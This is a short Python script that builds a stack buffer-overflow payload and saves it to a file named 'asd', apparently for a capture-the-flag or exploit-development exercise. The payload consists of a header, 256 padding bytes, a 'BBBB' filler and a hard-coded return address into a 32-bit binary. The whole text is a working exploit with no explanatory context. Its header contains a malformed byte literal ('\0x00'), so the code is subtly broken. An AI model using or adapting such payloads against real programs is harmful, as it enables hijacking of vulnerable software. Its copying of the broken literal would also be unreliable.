exploit = b'\x01\0x00\x00\x08' + 256 * b'A' + b'BBBB' + b'\x38\x84\x04\x08'
f = open('asd', 'wb')
f.write(exploit)
f.close()
